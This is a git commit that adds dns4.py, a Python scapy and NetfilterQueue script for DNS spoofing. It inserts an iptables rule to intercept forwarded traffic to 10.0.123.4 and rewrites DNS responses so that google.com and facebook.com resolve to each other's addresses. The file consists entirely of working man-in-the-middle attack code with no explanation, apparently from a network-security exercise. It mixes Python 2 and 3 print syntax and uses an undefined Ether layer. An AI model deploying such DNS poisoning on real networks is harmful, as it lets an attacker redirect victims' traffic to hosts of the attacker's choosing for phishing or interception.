8451d67daad4f8297b6e50d865f456d1dbc1a57d
Carlijnnn <102155259+Carlijnnn@users.noreply.github.com>
2024-05-23 13:35:13 +0200

    initial commit
    ARP and DNS scripts

---
+++ dns4.py
@@ -0,0 +1,64 @@
+import os
+import logging as log
+from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+ 
+ 
+class Spoof:
+    def __init__(self, dictionary, queueNum):
+        self.dictionary = dictionary
+        self.queueNum = queueNum
+        self.queue = NetfilterQueue()
+ 
+    def __call__(self):
+        print("Spoofing....")
+        #{self.queueNum}
+        os.system('sudo iptables -I FORWARD -d 10.0.123.4 -j NFQUEUE --queue-num 1')
+        self.queue.bind(self.queueNum, self.poison)
+        try:
+            self.queue.run()
+            print 'queue run: '
+        except KeyboardInterrupt:
+            os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
+            print("[!] iptable rule flushed")
+ 
+    def poison(self, packet):
+        scapyPacket = IP(packet.get_payload())
+        if scapyPacket.haslayer(DNSRR):
+            try:
+                queryName = scapyPacket[DNSQR].qname
+                if queryName in self.dictionary:
+                    scapyPacket[DNS].an = DNSRR(
+                        rrname=queryName, rdata=self.dictionary[queryName])
+                    scapyPacket[DNS].ancount = 1
+                    del scapyPacket[IP].len
+                    del scapyPacket[IP].chksum
+                    del scapyPacket[UDP].len
+                    del scapyPacket[UDP].chksum
+                    del scapyPacket[Ether].chksum
+                    print "modified", queryName
+                    packet.set_payload(bytes(scapyPacket))
+                else:
+                    print("not modified")
+            except IndexError as error:
+                log.error(error)
+            packet.set_payload(bytes(scapyPacket))
+        return packet.accept()
+ 
+ 
+if __name__ == '__main__':
+    try:
+        #ip adresses that we want to spoof
+        dictionary = {
+            b"google.com.": "157.240.201.35",
+            b"www.google.com.": "157.240.201.35",
+            b"www.facebook.com.": "142.251.39.100",
+            b"facebook.com.": "142.251.39.100"
+        }
+        queueNum = 1
+        spoof = Spoof(dictionary, queueNum)
+        spoof()
+    except OSError as error:
+        log.error(error)
+
